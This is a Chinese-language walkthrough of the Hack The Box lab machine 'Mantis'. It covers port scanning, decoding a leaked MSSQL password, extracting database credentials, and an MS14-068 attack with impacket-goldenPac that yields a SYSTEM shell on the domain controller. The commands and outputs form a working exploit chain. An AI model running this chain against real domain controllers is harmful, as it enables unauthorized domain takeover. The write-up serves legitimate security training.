---
title: Mantis
pagination_prev: null
pagination_next: null
---

## 信息收集

## 全端口扫描
~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ sudo nmap -sT -p- --min-rate 2000 10.10.10.52 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 21:53 EST
Nmap scan report for 10.10.10.52
Host is up (0.11s latency).
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
49172/tcp open  unknown
50255/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds
                                                                      

~~~
## 默认脚本扫描
~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ sudo nmap -sT -sC -sV -p 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49172,50255 10.10.10.52 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 21:57 EST
Nmap scan report for 10.10.10.52
Host is up (0.16s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-22 02:41:30Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
|_ssl-date: 2025-01-22T02:42:39+00:00; -15m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-22T02:34:03
|_Not valid after:  2055-01-22T02:34:03
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft IIS httpd 7.5
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49172/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ssl-date: 2025-01-22T02:42:39+00:00; -15m59s from scanner time.
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-22T02:34:03
|_Not valid after:  2055-01-22T02:34:03
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-22T02:42:30
|_  start_date: 2025-01-22T02:33:58
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 26m53s, deviation: 1h53m25s, median: -15m59s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2025-01-21T21:42:31-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.61 seconds

~~~
## 漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ sudo nmap -sT --script=vuln -p 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49172,50255 10.10.10.52 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 21:58 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.52
Host is up (0.14s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1337/tcp  open  waste
1433/tcp  open  ms-sql-s
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_tls-ticketbleed: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
49172/tcp open  unknown
50255/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 600.13 seconds




~~~

### LDAP 信息收集
使用windapsearch枚举用户失败
~~~
┌──(myvenv)─(kali㉿kali)-[~/htb/mantis/windapsearch]
└─$ python windapsearch.py -d htb.local --dc-ip 10.10.10.52 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.52
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=htb,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[!] Error retrieving users
[!] {'msgtype': 101, 'msgid': 3, 'result': 1, 'desc': 'Operations error', 'ctrls': [], 'info': '000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1'}
                                                       
~~~

### SMB 信息收集
暂时没有共享

~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ smbclient -L //10.10.10.52 -N    
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                              
~~~

### HTTP 8080 信息收集
看起来是个菜谱的博客

![](Pasted_image_20250122121331.png)

发现了一个登录页，试一下admin::admin失败

![](Pasted_image_20250122121453.png)

也没有什么有价值的公开漏洞


### Web 1337 信息收集
目录爆破一下发现secure_notes

~~~
┌──(lizi㉿lizi)-[~/htb/Mantis]
└─$ sudo gobuster dir -u http://10.10.10.52:1337 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt  -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.52:1337
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 160] [--> http://10.10.10.52:1337/secure_notes/]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
                                                                      
~~~

两个文件

~~~
dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt
web.config（无法访问）
~~~

![](Pasted_image_20250122154058.png)

## 漏洞利用

### 敏感信息泄露与数据库利用

查看dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt

![](Pasted_image_20250122154153.png)

文件名可能有点东西，尝试解密

~~~
┌──(lizi㉿lizi)-[~/htb/Mantis]
└─$ echo 'NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx' | base64 -d
6d2424716c5f53405f504073735730726421
~~~

解出的38个字符尝试用16进制解密

~~~
┌──(lizi㉿lizi)-[~/htb/Mantis]
└─$ echo '6d2424716c5f53405f504073735730726421' | xxd -ps -r
m$$ql_S@_P@ssW0rd!
~~~

使用dbeaver连接

![](Pasted_image_20250122170839.png)

得到两组凭据

![](Pasted_image_20250122171121.png)

~~~
admin::AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==(加密的)
james::J@m3s_P@ssW0rd!
~~~

拿james的凭据试一下SMB，没什么信息

~~~
┌──(lizi㉿lizi)-[~/htb/Mantis]
└─$ smbmap -H 10.10.10.52 -u james -p J@m3s_P@ssW0rd! -shares

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.52:445 Name: 10.10.10.52               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections

~~~

## 权限提升

### MS14-068 (Golden Ticket)

利用 MS14-068进行提权，这个漏洞允许普通用户生成黄金票据

~~~
sudo apt install krb5-user cifs-utils rdate
~~~

配置hosts

~~~
10.10.10.52     mantis.htb.local        mantis
10.10.10.52     htb.local
# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateHosts = false
127.0.0.1       localhost
127.0.1.1       lizi.   lizi

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
~~~

配置dns  /etc/resolv.conf

~~~
# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateResolvConf = false
nameserver 10.10.10.52
nameserver 10.255.255.254
~~~

~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ kinit james            
Password for james@HTB.LOCAL: 
                                                                                                                      
┌──(kali㉿kali)-[~/htb/mantis]
└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: james@HTB.LOCAL

Valid starting       Expires              Service principal
01/22/2025 05:11:08  01/22/2025 15:11:08  krbtgt/HTB.LOCAL@HTB.LOCAL
        renew until 01/23/2025 05:10:53

~~~

还需要james的sid
使用rpc获得

~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ rpcclient  10.10.10.52 -U "james"    
Password for [WORKGROUP\james]:
rpcclient $> lookupnames james
james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
rpcclient $> 

~~~

也使用这个[项目](https://github.com/mubix/pykek.git)的脚本，这里直接使用impacket-goldenPac

同步时间

~~~
sudo ntpdate 10.10.10.52
~~~

~~~
┌──(kali㉿kali)-[~/htb/mantis/pykek]
└─$ impacket-getTGT  htb.local/james:J@m3s_P@ssW0rd! -dc-ip 10.10.10.52 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in james.ccache

~~~



~~~
┌──(kali㉿kali)-[~/htb/mantis]
└─$ sudo ntpdate  10.10.10.52;impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
2025-01-29 08:53:29.22307 (+0800) -973.515211 +/- 0.059513 10.10.10.52 s1 no-leap
CLOCK: time stepped by -973.515211
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
/usr/share/doc/python3-impacket/examples/goldenPac.py:723: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
/usr/share/doc/python3-impacket/examples/goldenPac.py:749: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file nwXyBYrN.exe
[*] Opening SVCManager on mantis.....
[*] Creating service AeBC on mantis.....
[*] Starting service AeBC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system


~~~




